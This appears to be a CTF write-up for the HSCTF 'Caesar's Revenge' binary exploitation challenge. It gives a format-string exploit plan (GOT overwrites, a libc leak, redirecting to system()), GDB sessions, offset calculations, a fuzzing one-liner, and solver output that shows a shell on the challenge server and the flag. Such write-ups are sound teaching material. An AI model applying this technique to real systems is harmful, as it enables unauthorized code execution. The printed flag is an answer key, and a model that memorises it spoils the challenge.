# Caesar's Revenge
Binary Exploitation

## Challenge 

Julius Caesar's back, and he's not happy...

nc pwn.hsctf.com 4567

6/3/19 7:36 AM: Binary updated, SHA-1: 42280638b188cea498e7b6c55462dbf0351056f4 caesars-revenge

## Solution

Reference:

- https://github.com/zst-ctf/angstromctf-2019-writeups/tree/master/Solved/Returns
- https://security.stackexchange.com/questions/178006/how-to-leak-libc-base-address-using-format-string-exploit?rq=1
- https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/
- https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md
- https://security.stackexchange.com/questions/179747/leak-a-got-entry-using-return-to-printfplt

#### 64 bit ELF binary file.

Decompile in Hopper

    int caesar() {
        printf("Enter text to be encoded: ");
        fgets(&var_110, 0xfa, *stdin@@GLIBC_2.2.5);
        printf("Enter number of characters to shift: ");
        while (fgets(&var_180, 0x64, *stdin@@GLIBC_2.2.5) != 0x0) {
                var_18C = strtol(&var_180, &var_188, 0xa);
                if (((var_188 != &var_180) && ((*(int8_t *)var_188 & 0xff) == 0xa)) && (var_18C > 0x0)) {
                    break;
                }
                printf("Please enter an integer greater than 0 this time: ");
        }
        
        <snip>
        printf("Result: ");
        printf(&var_110);
        puts("\nThank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!");
        rax = *0x28 ^ *0x28;
        if (rax != 0x0) {
                rax = __stack_chk_fail();
        }
        return rax;
    }

From the source code, we see it is vulnerable to format string attack.

The input goes through a Caesar cipher, but it can be bypassed with a shift of 26.

The final printf is also optimised to puts.

#### Format string attack plan

- puts@GOT() -> caesar()
- leak libc 
- calculate system@libc()
- strtol@got() -> system()

#### Find leaked address (locally)

In GDB, debug the printed values

    # gdb caesars-revenge 

    (gdb) br caesar
    Breakpoint 1 at 0x40119a

    (gdb) run
    Welcome to the Caesar Cipher Encoder!
    Breakpoint 1, 0x000000000040119a in caesar ()
    
    (gdb) finish
    Run till exit from #0  0x000000000040119a in caesar ()
    
    Enter text to be encoded: ABCDEFGH %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp %lp
    
    Enter number of characters to shift: 26
    
    Result: ABCDEFGH 0x7fffffffc3a0 0x7ffff7fc28c0 (nil) 0x7ffff7fc7500 (nil) 0x6562b026 0xf077fffffffebf0 0x1a00000078 0x7fffffffea62 0x7fff000a3632 0x7fffffffea88 0x7ffff7ffe758 0x1 0x2 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x4847464544434241 0x20706c2520706c25 0x20706c2520706c25 0x20706c2520706c25 0x20706c2520706c25

    Thank you for using the Caesar Cipher Encoder! Be sure to like, comment, and subscribe!
    0x00000000004014b8 in main ()

    (gdb) printf "%p", __libc_start_main
    0x7ffff7e28fb0

We know that the first param (rdi) is the buffer

    (gdb) printf "%s", 0x7fffffffc3a0
    ABCDEFGH0x7fffffffc3a0 0x7ffff7fc28c0 (nil) 0x7ffff7fc7500 (nil) 0x6562b026 0xf077fffffffebf0 0x1a00000078 0x7fffffffea62 0x7fff000a3632 0x7fffffffea88 0x7ffff7ffe758 0x1 0x2 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x4847464544434241 0x20706c2520706c25 0x20706c2520706c25 0x20706c2520706c25 0x20706c2520706c25

Across runs, we see that the 2nd param seems to be it. It is equal to `__libc_start_main-1677584`

    (gdb) printf "%d", __libc_start_main - 0x7ffff7fc28c0
    -1677584

Now if we repeat again but turn on randomisation, we get consistent results for the offset


    (gdb) set disable-randomization off
    (gdb) br caesar 
    (gdb) run
    (gdb) finish
    ...
    Result: ABCDEFGH 0x7ffc6dca2b70 0x7f8fb73228c0 (nil) 0x7f8fb7327500 (nil) 0x6562b026 0xf077ffc6dca53c0 0x1a00000079 0x7ffc6dca5232 0x7ffc000a3632 0x7ffc6dca5258 0x2 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x4847464544434241 0x706c2520706c2520 0x706c2520706c2520 0x706c2520706c2520 0x706c2520706c2520

    (gdb) printf "%p\n", __libc_start_main
    0x7f8fb7188fb0
    
    (gdb) printf "%d\n", __libc_start_main-0x7f8fb73228c0
    -1677584

#### Find leaked address (locally)

We know the offset locally, but on the server it might be different. Let's view the code disassembly.

    (gdb) x/20i 0x7ffff7fc28c0   
       0x7ffff7fc28c0:  add    %al,(%rax)
       0x7ffff7fc28c2:  add    %al,(%rax)
       0x7ffff7fc28c4:  add    %al,(%rax)
       0x7ffff7fc28c6:  add    %al,(%rax)
       0x7ffff7fc28c8:  add    %al,(%rax)
       0x7ffff7fc28ca:  add    %al,(%rax)
       0x7ffff7fc28cc:  add    %al,(%rax)
       0x7ffff7fc28ce:  add    %al,(%rax)
       0x7ffff7fc28d0:  add    %al,(%rax)
       0x7ffff7fc28d2:  add    %al,(%rax)
       0x7ffff7fc28d4:  add    %al,(%rax)
       0x7ffff7fc28d6:  add    %al,(%rax)
       0x7ffff7fc28d8:  add    %al,(%rax)
       0x7ffff7fc28da:  add    %al,(%rax)
       0x7ffff7fc28dc:  add    %al,(%rax)
       0x7ffff7fc28de:  add    %al,(%rax)
       0x7ffff7fc28e0 <__after_morecore_hook>:  add    %al,(%rax)
       0x7ffff7fc28e2 <__after_morecore_hook+2>:    add    %al,(%rax)
       0x7ffff7fc28e4 <__after_morecore_hook+4>:    add    %al,(%rax)
       0x7ffff7fc28e6 <__after_morecore_hook+6>:    add    %al,(%rax)

From here we find out that it is in reference to `__after_morecore_hook`.

It is `__after_morecore_hook-32>`

#### Calculation to system (Locally)

Do locally check using LDD

    # ldd -r -v combo-chain
        linux-vdso.so.1 (0x00007ffdbc7fb000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f39ab941000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f39abb0d000)

        Version information:
        ./combo-chain:
            libc.so.6 (GLIBC_2.2.5) => /lib/x86_64-linux-gnu/libc.so.6
        /lib/x86_64-linux-gnu/libc.so.6:
            ld-linux-x86-64.so.2 (GLIBC_2.3) => /lib64/ld-linux-x86-64.so.2
            ld-linux-x86-64.so.2 (GLIBC_PRIVATE) => /lib64/ld-linux-x86-64.so.2

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
      2224: 0000000000023fb0   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5

    # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system           
      1418: 00000000000449c0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5


With this, test our offset in GDB across multiple instances

    // Get the current addresses
        (gdb) printf "%p\n", system                                            
        0x7ffff7e499c0
    
        (gdb) printf "%p\n", __libc_start_main
        0x7ffff7e28fb0

    // Calculate offset from 2nd parameter
        (gdb)  printf "%d\n", __libc_start_main - 0x7ffff7fc28c0
        -1677584

    // Calculate __libc_start_main
        (gdb) printf "%p\n", (0x7ffff7fc28c0 - 1677584)
        0x7ffff7e28fb0

    // Calculate system() using offerts
        (gdb) printf "%p\n", (0x7ffff7fc28c0 - 1677584 - (0x023fb0 - 0x0449c0))
        0x7ffff7e499c0

#### Calculation to system (Server)

We know the Libc version of the server (stated by the admins). We can look up on this website.

https://libc.blukat.me/d/libc6_2.23-0ubuntu11_amd64.symbols

    __libc_start_main 0000000000020740
    system 0000000000045390
    __after_morecore_hook 00000000003c67a0

#### Printf Offset to buffer

Fuzz

    (echo 'ABCDEFGH %lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp %08lp'; echo '26';) | ./caesars-revenge 

Find offset at 24

     # ./caesars-revenge 
    Welcome to the Caesar Cipher Encoder!
    Enter text to be encoded: ABCDEFGH %24$lp
    Enter number of characters to shift: 26
    Result: ABCDEFGH 0x4847464544434241

#### Solving

We have all the things we need. Now we can solve. It is similar to my past CTF code. More explanation over there.

- https://github.com/zst-ctf/angstromctf-2019-writeups/tree/master/Solved/Returns

Put to server

    # python3 solver.py 
    >> Exploit: puts@GOT() -> caesar()
    >> Leaked system(): 0x7ff5e7b61ac0
    >> Exploit: __stack_chk_fail@GOT() -> system()
    >> Exploit: printf@GOT() -> __stack_chk_fail@PLT()
    Enter text to be encoded: Enter number of characters to shift: Result:  

     0x404038          8@@sh: 1: Enter: not found
        /bin/sh;
    sh: 1: Enter: not found
        /bin/sh;
    sh: 1: Please: not found
        26
    sh: 1: Result:: not found
        ls -la
        total 68
        drwxr-x--- 1 0 1000  4096 Jun  3 15:10 .
        drwxr-x--- 1 0 1000  4096 Jun  3 15:10 ..
        -rwxr-x--- 1 0 1000   220 Aug 31  2015 .bash_logout
        -rwxr-x--- 1 0 1000  3771 Aug 31  2015 .bashrc
        -rwxr-x--- 1 0 1000   655 May 16  2017 .profile
        drwxr-x--- 1 0 1000  4096 Jun  1 20:11 bin
        -rwxr-x--- 1 0 1000 17096 Jun  3 11:32 caesars-revenge
        -rwxr-x--- 1 0 1000  1458 Jun  3 04:02 caesars-revenge.c
        drwxr-x--- 1 0 1000  4096 Jun  1 20:11 dev
        -rwxr----- 1 0 1000    48 Jun  3 15:09 flag
        drwxr-x--- 1 0 1000  4096 Jun  1 20:11 lib
        drwxr-x--- 1 0 1000  4096 Jun  1 20:11 lib32
        drwxr-x--- 1 0 1000  4096 Jun  1 20:11 lib64
        cat flag
        hsctf{should_have_left_%n_back_in_ancient_rome}


## Flag

    hsctf{should_have_left_%n_back_in_ancient_rome}
